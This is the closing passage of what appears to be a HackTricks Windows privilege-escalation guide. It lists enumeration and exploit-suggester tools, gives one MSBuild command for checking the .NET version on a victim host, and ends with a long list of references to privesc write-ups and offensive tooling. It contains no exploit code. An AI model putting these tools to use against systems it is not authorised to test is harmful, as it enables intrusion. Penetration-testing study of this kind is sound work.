[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
